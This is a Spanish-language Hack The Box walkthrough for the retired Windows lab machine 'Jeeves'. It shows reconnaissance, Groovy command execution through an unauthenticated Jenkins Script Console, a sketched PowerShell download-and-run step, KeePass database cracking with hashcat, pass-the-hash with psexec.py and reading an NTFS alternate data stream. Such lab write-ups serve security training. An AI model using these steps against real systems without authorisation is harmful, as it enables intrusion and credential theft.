---
machine: Jeeves
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows / Credenciales
state: Retired
tags: [jenkins, groovy, keepass, pass-the-hash, ads, alternate-data-stream]
---

# Jeeves — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

El 80 es un señuelo. En el **50000** corre **Jenkins** (`/askjeeves`) **sin autenticación**, con *Script Console* de Groovy: ejecución de comandos como `kohsuke`. En su carpeta `Documents` hay una base **KeePass** (`CEH.kdbx`) cuya contraseña cae con diccionario; dentro está el hash NTLM del administrador → **pass-the-hash**. La flag final está en un **flujo de datos alternativo** de NTFS (`hm.txt:root.txt`).

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp    open  http       Microsoft IIS (página "Ask Jeeves" falsa)
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  http       Jetty (Jenkins 2.87)
```

```bash
ffuf -u http://<IP>:50000/FUZZ -w ... -t 200
# askjeeves
```

## Acceso

**Script Console** (`/askjeeves/script`) ejecuta Groovy como la cuenta del servicio:

```groovy
println "whoami".execute().text
```

Reverse shell con `cmd.exe` y sockets, o descargar un ejecutable con `powershell -c IEX(...)`.

```groovy
def p = ["cmd","/c","powershell -nop -c ..."].execute(); p.waitFor()
```

## Escalada

1. **KeePass** en `C:\Users\kohsuke\Documents\CEH.kdbx`; se exfiltra con `impacket-smbserver`.

```bash
keepass2john CEH.kdbx > hash.txt
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
```

2. Dentro hay credenciales y un **hash NTLM** del administrador. Con `psexec`/`wmiexec`:

```bash
psexec.py -hashes :<NTHASH> administrator@<IP>
```

3. **Flag final**: en el escritorio de Administrator no hay `root.txt` sino `hm.txt`.

```text
type hm.txt          → "The flag is elsewhere. Look deeper."
dir /r               → hm.txt:root.txt:$DATA
more < hm.txt:root.txt
```

## Tropiezos

- **El 80 no lleva a nada**: es una página estática que imita un buscador.
- **Volumen de Jenkins**: la consola es la vía más rápida; los jobs no hacen falta.
- **`dir` normal**: sin `/r` los flujos alternativos son invisibles.

## Lecciones

- Jenkins sin autenticación es shell inmediata: la *Script Console* es RCE por diseño.
- Un gestor de contraseñas en un perfil de usuario concentra todo el impacto.
- Pass-the-hash no necesita la contraseña, sólo el hash NTLM.
- NTFS esconde datos fuera de la vista del explorador: `dir /r`.
